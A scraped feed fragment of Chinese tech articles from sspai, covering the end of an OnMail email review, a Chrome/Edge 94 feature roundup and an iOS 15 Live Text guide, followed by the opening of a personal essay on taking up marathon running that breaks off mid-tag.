都会出现一个许可同意的界面，如果你不同意，那么他们无论如何都无法给你发送消息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c59b19lb34tcoadpunlg.png\"></figure><p>而如果你选择了 封禁/block 这个账户，那么以后来自这个邮箱的邮件都会被送到垃圾箱里面。可以非常好的保障你收件箱里面的邮件都是你真正需要获取并且获得你的允许的邮件。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c59b1adb34tcoe41hesg.png\"></figure><p>你可以在一个类似于管理页面的地方地方管理所有的许可，处理给予许可账户和封禁账户以及目前搁置的账户。这样就算你误操作了或者是后续需要修改也可以在这里完成。</p>\n<p>同时，我个人非常喜欢的一点就是在整理收件箱的时候，通过点击发件人的头像即可快速将邮件归档，更加符合自觉，同时因为头像和多任务的选项靠的比较近，我可以方便的切换成单个操作或多选操作。而如果归档、已读/未读、删除操作在右边，那么是需要移动一定的距离，反而增加了操作成本。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c59b1alb34tcoe41het0.png\"></figure><p>同时，Onmail 把收件箱分类为 主要/Primary 和 其余/Other 两个分类。其他分类则是类似瀑布流布局的样式，可以一眼看到整个邮件的主要部分，进入预览模式以更快地阅里面的内容，只是我觉得 2 列占用面积太大，对于快速区分和筛选的效率不高。虽然右上角的 Preview 可以切换排列模式，但是如果可自定义会更好。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c59b1bdb34tcokqhdvm0.png\"></figure><h2>跟进邮件</h2>\n<p>这个功能其实我挺喜欢的，当你查看一份邮件的时候，能够看到和这个邮箱账户的所有往来信件。这样很方便我们追溯之前的沟通信息。试想一下当你经过一个假期后，需要与合作对象跟进进度，沟通的时候很可能忘记之前的进展以及沟通详情，而一个假期后你也会受到许多其他邮件，那么只需要找到这个发信人的任意一封邮件都可以查看所有的历史往来邮件，能够节省非常多的精力和时间，也避免了发错邮件的存在。</p>\n<p>同时在这个历史往来的记录里，你还能够看到与这个账户沟通中收到的所有文件、照片，就不再需要我们在对某一个账户进行分类，特别是在工作或者是与他人沟通的时候，能够快速了解之前的沟通情况以及目前的进展。这也是目前其他邮件服务商没有提供的一个服务。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c59b1cdb34tcom8unqr0.png\"></figure><p>除此之外，还有一个 附件/Attachments 的文件夹用于查看你整个收件箱中所有的文件，包括了历史照片、视频、账单、收据、机票和其他信息，相比于我现在用的 Gmail 的确会方便很多。特别是我会每周都通过快捷指令来导出 Leancloud 的数据，Leancloud 会给我发送这个数据库的 json 文件，使用 Gmail 的时候我是通过单独设定了一个过滤器，归类并收纳所有来自 Leancloud 的文件，方便我统一管理和下载文件备份。而通过 OnMail 我可以不用去考虑单独为它过滤，直接去附件库查找即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c59b1clb34tcoe41heug.png\"></figure><h2>Inbox Break</h2>\n<p>这个功能其实类似于一种勿扰模式，当你设定好了规定的时间后，所有的邮件都会暂时停止接收到你的邮箱一直到超过你的规定时间后，才会进入你的收件箱。同时，也支持在这个期间内自动发送「离开」回复。这个其实比较适合于工作需求的人，下班后可以暂停收到邮件，其实是把生活和工作分割开来。</p>\n<p>对于我来说，如果在工作一天回到家里后，打算放空一下自己，准备休息的时候收到了工作邮件的提醒，就算是不需要立刻完成的任务，也会给心情带来糟糕的感觉。这也是为什么我非常喜欢飞书而不是微信来工作沟通，因为如果使用微信沟通，那么大家会默认你看见消息（毕竟没人不看微信）。会非常影响自己的生活节奏。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c59b1dlb34tcom8unqrg.png\"></figure><h2>反追踪 Anti-tracking</h2>\n<p>追踪像素会嵌入到电子邮件中，隐藏在图像或链接里。当你打开电子邮件后，跟踪代码就会把追踪信息发送回公司的服务器，它会告诉发送方得知收件人在哪里、在什么时候，在哪种类型的设备上查阅了邮件，随之而来的是无穷无尽的广告邮件、诈骗信息等。而反跟踪技术可阻止侵入性广告定位者监视我们的电子邮件。</p>\n<p>OnMail 提供了自动阅读回执阻止，但是并不会禁用邮箱的图像，让用户用起来更加的放心和便利。而在 Gmail 里面则需要禁用图像才能够实现这个功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c59b1e5b34tcoadpunm0.png\"></figure><h2>其余功能</h2>\n<p>其他方面，OnMail 和其他的邮件服务一样，支持你自定义设置邮箱的标签、回复签名、假期自动回复和邮件过滤规则设置等。不过 OnMail 也有缺点就是全英文，不过我相信对于少数派的读者来说，应该不算什么事情。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/bed66acddc2fab97ec2e6b39caac2d2e.jpg\"></figure><ol>\n<li>OnMail 提供了 10GB 的存储空间，相比 Google Drive 和所有谷歌服务数据共享的 15GB 则是多了不少。</li>\n<li>如果你有一段时间没有阅读一下订阅的邮件，OnMail 就会自动提醒你是否要退订此邮件，保证你的邮箱一直都是有效信息。</li>\n<li>OnMail 内置了几个 智能文件夹/Smart，能够帮助你分类和整理你的旅行、购物和其他信息进行排序，你不需要做其他的操作就可以分类整理。不过这个功能我个人原因没有体验到。</li>\n<li>OnMail 另一个巧妙的部分是它会自动解析您收到的电子邮件，并智能地呈现其中找到的信息。例如，航班预订将显示为信息卡，如上所示：</li>\n<li>OnMail 免费和个人帐户允许以 @onmail.com 电子邮件地址为后缀的最短 8 个字符或者更多。而升级到 个人/Personal 和 专业/Professional 服务后，则可以最短 4 个字符。不过目前我也不需要这些升级，对于那些英文名或习惯的称呼较短的用户来说，8 个字符会增加一点点易记性。</li>\n<li>OnMail 还支持夜间模式，非常适合那些夜猫子用户，毕竟每次打开 Gmail 我都会被亮瞎我的眼睛。我本身就对所有的带夜间模式的产品感到有好感，这波是非常加分的一点。但是我总觉得这个黑色太深了，如果能够选择灰色可能会对视觉上来说更友好一点。</li>\n</ol>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/119da8feac1507a3d9ecb66242589858.png\"></figure><h3>小缺点</h3>\n<h4>有干扰信息的背景图和名人名言</h4>\n<p>不过我也有一些不喜欢的点，那就是 OnMail 喜欢在空页面增加一些风景照和一些「名言警句」让我没有那么舒服，我认为这本身也是一种打扰用户的垃圾信息。当然这是见仁见智，可能有些人会喜欢这张放松的感觉？</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/8a35669998ae8c7b6d1f3a5e394624d9.png\"></figure><h4>搜索和筛选功能</h4>\n<p>OnMail 目前的智能筛选所有附件和内容仍然有缺陷，至少没有它们声称的那么完美，我的一些邮件里面的图片、文档并没有检索出来仍然是只能在邮件内查看，在 附件库/Attachments 并没有找到一些应该被展示的数据 。</p>\n<p>其次它的搜索功能里面有一个卖点就是更加智能化的语义搜索，以「last week from jimmy」和「Attachments from Kathryn」为例的功能特点，在中文语境下并不适用，再加上英文界面仍有一定的使用门槛。</p>\n<h2>总结</h2>\n<p>但是总的来说 OnMail 目前看来是一款还不错的新生代邮件，和老牌的服务商相比提供了更多的功能和特性，但仍然有一些地方需要追赶。至少在于用户体验上还是不错的，但是对于 Gmail 和国内的 163 以及 QQ 邮箱其实并不占优势，用户迁移邮箱的成本和意愿也是他们面临的问题之一。但是作为一个临时邮箱我认为是一个很不错的体验。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69021"},{"title":"更快的稳定版更新节奏开始了：Chrome/Edge 94 新功能盘点","date":"2021-09-28 08:00:00","description":"\n<p>本月，Chrome 和 Edge 正式迎来 4 周一次的全新稳定版更新周期，相比此前（6 周一次）节奏加快了不少。为此，Edge 也从本次更新开始面向企业用户推出了「扩展稳定更新选项」，允许企业用户通过组策略部署的方式将更新周期手动调整为 8 周一次。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgmtb34tehemeg5b0.png\"></figure><p>对普通用户来说，更快的更新节奏虽然难免导致实际更新内容的减少，但偶尔也会有一些不容错过的重要功能更新。本文就为大家汇总了本次 Chrome/Edge 94 稳定版的主要更新内容，希望能为你提供一些参考。</p>\n<h2>Chrome</h2>\n<h3>新版设置界面/桌面端</h3>\n<p>Chrome 设置中心页面在本次稳定版更新后开始启用全新的设计样式。或许是 Google 为了统一 Chrome 的界面以及相关设计元素，新版移除了原先设置页面上方的蓝色顶部通栏，转而采用和 Chrome OS 一致的纯色设计，原先较为冗长的设置项目现在也被有意梳理成了更加直观、易懂的不同设置区域，通过侧边栏即可进行导览。这些更新其实也可以看作是 Google WebUI 设计改造的一部分。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgn5b34tehi7lc44g.png\"></figure><p>如果你在更新到 Chrome 94 稳定版后没有看到新版设置页面，也可以手动开启 <a href=\"chrome:flags#webui-branding-update\" target=\"_blank\">WebUI Branding Update</a> 功能标签来进行体验。</p>\n<h3>新版共享中心/桌面端</h3>\n<p>相比 Edge 很早之前就开始改造分享中心，Chrome 对浏览器分享功能的改造可谓是先发后至，不过在 Chrome 94 中好歹还是上线了。</p>\n<p>和当前的 Android 版 Chrome 类似，新版共享中心可以快速就当前浏览的页面进行链接复制、生成二维码、投射或者保存等操作，同时还提供了部分社交媒体入口方便快速分享。当然有一说一，比起 Edge 的分享功能，Chrome 共享中心支持的跳转目标还是少了点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgn5b34tehi7lc450.png\"></figure><p>如果你在更新到 Chrome 94 稳定版后没有看到新版设置页面，也可以手动开启 <a href=\"chrome://flags/#sharing-hub-desktop-omnibox\" target=\"_blank\">Desktop Sharing Hub in Omnibox</a> 功能标签来进行体验。</p>\n<h3>可选 HTTPS-only 模式/桌面端、Android</h3>\n<p>虽然 Chrome 从很早之前就开始执行 HTTPS-First 规则，但此前的规则仅在有 HTTP 和 HTTPS 同时可选的情况下才会优先加载 HTTPS 页面。Chrome 94 正式加入的 HTTPS-only 模式就更加严格一点，在设置中选中开启后，如果网站不支持 HTTPS 会被直接阻止加载。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgndb34teho7grh00.png\"></figure><p>对网络安全有较高要求的朋友不妨在「设置 &gt; 隐私设置和安全性 &gt; 高级 &gt; 一律使用安全链接」中开启试试；不过当前的国内互联网环境下，严格的 HTTPS 规则偶尔也会在浏览时造成困扰吧。</p>\n<h3>Material You 视觉更新/Android</h3>\n<p>从 Chrome 93 开始，Google 就开始了针对 Android 12 设计风格的适配，在本次推送的 Chrome 94 中，Material You 又进一步为 Chrome 的外观增色不少。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/cca72a92bbcd6d7d27fe40ee92e39d5d.png\"><figcaption>Chomre 94 在 Android 12 上的视觉效果</figcaption></figure><p>地址栏背景、选词高亮背景、标签页预览卡片边框、设置菜单……Chrome 94 中不少浏览器组件都会从 Android 12 的壁纸中提取色彩，让浏览器与系统之间的观感体验更加和谐一致。不过这些新变化在 Chrome 94 也并非是直接开启的，依旧需要通过手动启用 <a href=\"chrome:flags#dynamic-color-android\" target=\"_blank\">Dynamic colors on Android</a> 和 <a href=\"chrome:flags#theme-refactor-android\" target=\"_blank\">Theme refactor on Android</a> 两项功能标签来手动开启。</p>\n<h3>在非标签组中打开新标签/Android</h3>\n<p>Android 版的 Chrome 引入了「标签组」概念之后，新标签中打开链接竟然只能在现有的「标签组」中页面了。虽然是个小变化，但对重度浏览器用户的使用习惯冲击不小。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgntb34tehr0hggrg.png\"></figure><p>或许也是因为这份争议，Chrome 94 稳定版又把允许用户在标签组外的「新标签页打开」功能默默加了回来——但并不是默认开启的，手动启用 <a href=\"chrome://flags/#enable-start-surface\" target=\"_blank\">Start Surface</a> 并选择 <code>Enabled Single Surface V2 Finale</code> 这个选项，然后确保 <a href=\"chrome://flags/#enable-tab-grid-layout\" target=\"_blank\">Tab Grid Layout</a> 功能标签选择 <code>Enabled without auto group</code>，重启后就能在长按菜单中看到「使用新标签页」打开了。</p>\n<h3>桌面版空闲检测/桌面版</h3>\n<p>除了上面我们看到的新功能之外，Chrome 94 中还引入了一个颇具争议的 API：空闲检测（Idle Detection）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/ef67e1c89b6fe7e1a66c3850ffb16736.png\"></figure><p>简单来说，通过这个 API 浏览器可以判断用户当前是否有浏览动作，并通过 API 接口向开发者提供这一状态信息，因此也很有可能被滥用。这一 API 在 Chrome 94 稳定版中默认启用，如果你对这一数据较为敏感，不妨在网站权限控制中对「您的设备使用情况」一项勤加检查。</p>\n<h2>Edge</h2>\n<h3>标签页分组/桌面版</h3>\n<p>这个早已出现在 Chrome 上的功能其实在 Edge 93 中也随垂直标签页回归了，而本次在 Edge 94 中的亮相，可以看作是微软对标签页分组功能的一次正式推广。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgo5b34tehr0hggs0.gif\"></figure><p>Edge 94 稳定版的标签页分组功能相比 Chrome 94 的确要更加好用，除了常规的标题、颜色标记外，Edge 94 也允许我们点击分组标签来对分组进行折叠隐藏，进一步提升标签栏利用空间；同时对 Windows 用户来说也非常友好：我们可以按住 Shift 或 Ctrl 一次性连选、跳选多个标签页面进行分组归纳。</p>\n<h3>新的新闻聚合主页：Microsoft Start/桌面版、移动版</h3>\n<p>Microsoft Start 是微软近期上线的个性新闻源和信息内容集合服务，你可以看作是以往 MSN 新闻内容的升级版，但提供了更为清晰的分类并减少了广告的干扰，现在可以通过设置 <a href=\"https://www.microsoftstart.com/\" target=\"_blank\">Microsoft Start</a> 为主页来进行访问，另外该服务还推出了 Android 和 iOS 独立应用。</p>\n<p>不过就国内用户的体验来说，这里提供的资讯质量相比 Windows 10 任务栏的资讯与天气、Windows 11 小组件页面的资讯而言并无差别。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgolb34tehi7lc460.png\"></figure><h3>购物、旅行好帮手/桌面端</h3>\n<p>或许是一年一度的购物季即将到来，Edge 近期的更新内容不少都和网络购物有关。</p>\n<p>Edge 94 稳定版针对在线购物体验也进行了优化，在访问一些在线购物网站时，可以直接在地址栏查看相关的商品评价和顾客评分，让我们在下单前多一些参考。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgotb34tehr0hggsg.gif\"></figure><p>在某些网站上，Edge 甚至可以直接利用用户保存的信息来自动完成结账，进一步简化购物流程。不过缺点也很明显——这些功能在国内购物网站中并不适用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgp5b34tehr0hggt0.gif\"></figure><p>与之类似的，你还可以让 Edge 94 来帮助你规划你的旅行和假期，比如通过为旅行目的地提供建议来帮助制定旅行计划、搜索航班时可以在地址栏看到对应地点的餐厅以及观光建议等等。同样是国内几乎用不上的功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgpdb34tehi7lc46g.gif\"></figure><h3>改进了打开 MHTML 文件的方式/桌面端</h3>\n<p>MHTML 属于微软当前自己搞出来的网页标准，在这个后 IE 时代显得有些尴尬，但考虑到向前的兼容性有时又必须使用 IE 打开。</p>\n<p>Edge 94 稳定版中，微软调整了该格式文件的打开逻辑：如果启用了 IE 模式，MHTML 将继续使用 IE 模式打开，除非这个 MHTML 是由 Edge 通过保存的；使用 Edge 保存的 MHTML 文件依然默认由 Edge 打开。</p>\n<h3>阻止混合内容下载/桌面端</h3>\n<p>这同样是在 Chrome 就已经有的功能，简单来说就是如果一个网站中的既有 HTTPS 内容也有 HTTP 的内容，那么在当前页面中下载 HTTP 内容将会被阻止。</p>\n<h3>辅助设置汇总/桌面端</h3>\n<p>和 Chrome 类似，在 Edge 94 中终于有了一个可以集中调整辅助设置的页面，并且相比设置分类要更为清晰。</p>\n<p>在「使 Microsoft Edge 更易于查看」这个部分中，我们可以调整页面缩放、打开字幕的系统首选项以及在页面焦点区域周围显示高可见性大纲；而「使 Microsoft Edge 更易于使用」这个部分则提供了在关闭多个标签页之前进行询问、选择文本时显示迷你菜单、下载开始时显示下载菜单等选项。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c58pgplb34tehr0hggtg.png\"></figure><p>总之，更新后花点时间在这个新页面中调校一番，应该能让 Edge 的使用体验更加舒适一点。</p>\n<h2>小结</h2>\n<p>除了上述功能变化，一些偏向开发者的更新以及安全更新本文就不再展开细说了。你选择哪一款浏览器作为主力浏览器使用呢？欢迎在评论区聊聊你的使用体验以及看法。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69008"},{"title":"iOS 15 最受欢迎功能之一，不装 App 轻松实现「图片转文字」：实况文本","date":"2021-09-28 06:47:57","description":"\n<p>9 月 21 日，iOS 15 和 iPadOS 15 正式发布，这一次更新，Apple 为其移动端设备带来了诸多<a href=\"https://sspai.com/post/68870\" target=\"_blank\">实用功能</a>，尽管此次更新少见大刀阔斧的改变，但细微之处的功能打磨却处处可见。</p>\n<p>在第一次体验到「实况文本」这一功能的时候，我联想到了大学时期，在课堂上举着 iPad mini 拍下一张又一张照片，然后匆匆将照片添加到笔记应用里就没了后续的自己，没有多少人会勤奋到课下再去把照片上的文字手动整理一遍，于是这些无效笔记只能成为我假装努力的证明。</p>\n<p>没有想到时隔多年，只要将镜头对着文字，手机就能够自动帮你识别文字并允许你快速复制并进入编辑环节的场景真的能够实现，这得益于 iOS 15 和 iPadOS 15 为我们带来的「实况文本」这一强大功能。</p>\n<h2>什么是「实况文本」</h2>\n<p>实况文本（Live Text）是 Apple 为 iOS 15 和 iPadOS 15 新增的实用功能之一，简单来说，实况文本能够帮助我们把照片、屏幕乃至相机预览界面当中的文字转化为可供编辑的文本，我们也可以将其视作系统级的 OCR 工具。在 Apple 官网中，实况文本功能被简单分为了照片中的实况文本、相机中的的实况文本、实况文本翻译三个主要分支功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c598hodb34tehr0hgi20.png\"></figure><p>顾名思义，照片中的实况文本意味着我们可以轻松识别照片当中的文字，并对识别后的文字使用诸如拷贝和粘贴、查询以及翻译等功能，我们甚至可以在系统识别到文字当中的邮件、电话号码乃至地址后直接调取相应的功能。</p>\n<p>当我们将手机镜头对准任意文字时，便能触发相机中的实况文本功能，从而在相机取景框直接获取到我们需要的内容；在通过实况文本获取到相应的文字后，我们还能将文字通过实况文本翻译转化为 7 种不同的语言：英语、中文、法语、意大利语、德语、葡萄牙语和西班牙语。</p>\n<p>根据官网介绍：</p>\n<blockquote><p>实况文本功能适用于照片 app、截屏、快速查看、Safari 浏览器， 以及用相机 app 进行的实时预览……在配备 A12 仿生或后续芯片的 iPhone 上提供。</p></blockquote>\n<p>在实际测试中，升级了 iPadOS 15 的 iPad mini 5（配备 A12 仿生芯片）同样可以识别照片 app、截屏当中的文字。</p>\n<p>除了实况文本这一功能，Apple 在 WWDC21 大会上还介绍了名为 Visual Look Up 的一项功能，这一功能可以帮助用户识别相片中的场景、物品，支持的内容范围包括动植物、绘画、书本、建筑等各种信息，可以视作实况文本功能的加强版和补充，功能类似于 Google 早先推出的 Google Lens。不过，这项功能暂时没有出现在 iOS 15 的第一个正式版本中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c598holb34tehi7lc5eg.jpeg\"></figure><h2>怎么用「实况文本」</h2>\n<p>作为一项系统级功能，实况文本功能具备多种触发方式，能够最大意义上为用户所用，具体的触发方式有以下几种：</p>\n<h3>相机取景框触发</h3>\n<p>打开 iPhone 上的相机应用，将镜头对准任意有文字内容的画面，我们都能够在取景框中看到实况文本按钮，点击该按钮后文字所在区域会以悬浮窗口的形式呈现，此时，这一窗口中的所有文字内容都能够被直接选取从而进行后续的复制、分享、查询乃至翻译等操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c598hotb34tehr0hgi2g.jpeg\"></figure><h3>相册 app 自动识别照片文字</h3>\n<p>除了相机取景框，我们还能够在系统相册当中体验实况文本功能，打开任意包含文字内容的图片后，我们都能在图片下方看到实况文本按钮，这意味着该图片当中的文字均能够进行点选。</p>\n<p>而对于一些仅包含极少量文字的图片，尽管实况文本按钮不会出现，但是通过长按，这一部分文字仍然是可以被选中的。更为惊喜的是，通过在系统的聚焦功能中搜索，我们还能够在搜索结果中获取到包含相关文字的照片。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c598hp5b34tehr0hgi30.jpeg\"></figure><h3>截屏界面触发</h3>\n<p>在 iOS 15 和 iPadOS 15 中，用户能够在截屏后直接看到实况文本按钮，通过这一操作，我们能够将以往不允许直接复制的文字内容通过截屏后识别获取，整体操作非常简便，用完即走。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c598hpdb34tehr0hgi3g.jpeg\"></figure><h3>任意界面点选输入框触发</h3>\n<p>实况文本功能还出现在系统的各个位置，可以这样说：只要有输入框的位置，就一定有实况文本功能的身影。</p>\n<p>通过在任意界面点选输入框，我们都能够菜单中看到实况文本按钮，点击该按钮，系统键盘会被相机取景器所取代，此时将手机镜头对准任意想要识别的文字，相应的文字内容会被自动识别并填充到输入框中。</p>\n<p>这一功能已经在新系统发布后被众多笔记、编辑器应用支持，这也意味着，我们可以在移动手机镜头的过程中就轻松输入书本上或屏幕上的文字。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c598hplb34teho7grii0.jpeg\"></figure><h2>效果怎么样</h2>\n<p>不得不说，iOS 实况文本这一系统级功能的加入对于一众主打 OCR 功能的应用而言无疑是一种强势挑战，但对于文本编辑类应用而言却是一件意外之喜。</p>\n<p>以往如果我们想要将照片或所拍摄屏幕上的文字保存为文本格式，少不了要经历拍摄、分享至第三方应用、识别、点选复制、编辑等多个步骤，实况文本的加入能够帮助我们直接减少中间环节，允许我们直接复制取景框和图片中的文字。</p>\n<p>因此单纯论使用的便捷性，实况文本这一系统级功能无疑更加方便易用，更何况它还完全免费。</p>\n<p>不过这是否就意味着第三方扫描应用和 OCR 应用从此就毫无用武之地了呢？答案是否定的，如果你有大量扫描分档并进行文字识别的需求，第三方应用能够为你带来更加畅快、专业的扫描功能支持，且类似与《<a href=\"https://sspai.com/post/47838\" target=\"_blank\">白描</a>》这样的应用还允许我们在扫描多页文档后，对文档内容统一进行 OCR 识别，这一点实况文本暂时做不到。</p>\n<p>此外，第三方应用如《<a href=\"https://sspai.com/post/64043\" target=\"_blank\">Scanner Pro</a>》对于扫描好的文档能够做到分门别类的归档和整理，这一功能对于需要留存原始资料的人群而言非常重要，而实况文本更多地为我们带来了识别完就走的畅快感，但在资料留存和归档上却略有短板。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c598hqdb34tehi7lc5f0.jpeg\"></figure><h2>总结</h2>\n<p>总的来说，实况文本最大限度地降低了用户使用 OCR 功能的门槛，或许以后向你询问怎么把屏幕上的文字快速复制下来的人会越来越少，这一功能同样为大量文本编辑和笔记应用带来了广阔的应用空间，从此，做书摘、快速引用书内文字都将变得无比简单。</p>\n<p>当然，文字的快速识别只是第一步，而手机背后的人如何使用文字，如何让这一功能真正辅助于生活和学习、工作，才是更加值得我们去探索和思考的事情，正如把屏幕上的一张张 PPT 拍下来只是开始，将文字内化为属于自己的知识才应该是根本目标。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，带你了解 Apple 新硬件 &amp; 新系统 📱</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派 sspai 官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69015"},{"title":"有哪些对生活「坚持」的小事，成就了今天的你？","date":"2021-09-28 05:46:48","description":"\n<p>中秋回老家时被高中同学调侃：说我<b>高中时参加学校运动会跑200米，跑完后在家里躺了一整天，没想到现在都能跑马拉松了。</b></p>\n<p>其实那是被迫去参加的校运动会，大家都不愿意去，因此就被拉去充数了，平时从来不锻炼的我，跑200米后感觉都要猝死了，第二天整整一天都没有缓过来。</p>\n<p>大学毕业后看到身边有人跑马拉松，当时觉得这人是不是脑子有问题，跑步这么无聊的运动竟然也去跑，随便找项运动也比跑步有趣啊。</p>\n<p>在这里真香定律毫无意外的又发挥作用了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7e14e0e84e372b87465328d5b23245cd_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1031\" data-watermark=\"watermark\" data-original-src=\"v2-7e14e0e84e372b87465328d5b23245cd\" data-watermark-src=\"v2-b1d7bf6bb56ea034a0e3d54f016c0ab7\" data-private-watermark-src=\"v2-5ea12952ffaba50c76c187fb7c8ebf10\"></p>\n<p><b>在刚跑马拉松的时候一个朋友对我说过：每一个马拉松爱好者的背后都有一段不为人知的故事。要不然是什么支撑他/她去从事这么无聊的运动</b></p>\n<p>一件事情即使再好再有用，如果不能及时的解决你当下的问题，<b>特别是那种迫在眉睫的问题</b>，也很难能一直坚持下去————这是我最近一直在想的问题，也是对跑步的一点感悟。</p>\n<p>我开始跑步的原因很简单，从大学到社会后发现所有的憧憬全部幻灭，<b>之前在大学的一切美好幻想在每天的重复劳动中被消耗殆尽，原来自己仅仅是一个卑微的不能再卑微的没有人关注的打工人。</b></p>\n<p>那段时候很痛苦，读这么多年书好像并没有什么用，<b>晚上睡不着白天睡不醒，时常一个人待在自己20米的出租屋里发呆。</b></p>\n<p>觉得自己不能一直这么下去，做点什么吧，让其他的事情转移自己的注意力。甚至于想到让更大的痛苦和现有的痛苦对冲，于是想到了跑步，让自己跑到精疲力尽的那种。</p>\n<p>那时候跑5km都得跑40分钟，而且跑到后面简直每一步都在用意志力在「坚持」。</p>\n<p><b>但是最大的好处是跑完后洗完澡心情也好多了，也能睡得着觉了，这点太重要了，也是自己为什么一开始那么痛苦却还能坚持下去的原因。</b></p>\n<p><b>很多人跑步没有坚持下去就是因为倒在了刚开始的最痛苦的那一段！</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-521ce5898e74c32cec8871ec7d161c4a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1117\" data-watermark=\"watermark\" data-original-src=\"v2-521ce5898e74c32cec8871ec7d161c4a\" data-watermark-src=\"v2-75b17a70a256f62be06c98485e677327\" data-private-watermark-src=\"v2-6bedec88cb253ba4605f018e6d1d7aa5\"></p>\n<p>而我阴差阳错的因为个人的原因反而成为了促使我跑下去的原因。这种痛苦正好可以和生活本身的痛苦对冲。</p>\n<p><b>就这样开始了跑步的征程，从5km到8km，到10km，到半马，到全马42.195km。时间越久，也越无聊越痛苦，对于我来说反而是一件开心的事。</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-63f13e255365764b5a4ca6ea0f5ba2d4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1062\" data-rawheight=\"512\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-7de28b3defeb1ecb0b9cc318983c0f19_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"580\" data-rawheight=\"772\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>任何事情之所以能一直做下去肯定是因为有收益，这种收益不一定是金钱上的。</p>\n<p><b>它可以是变成了你的兴趣爱好，一天不跑就不开心；</b></p>\n<p><b>它可以改进你的一些做事的方式方法，跑步训练让自己养成了做计划的习惯；</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5ae06b4c6fbe8ec4ed58621a35b0292a_720w.jpg?rss\" data-caption=\"在佳速度上自己做的一个马拉松课表\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2244\" data-watermark=\"watermark\" 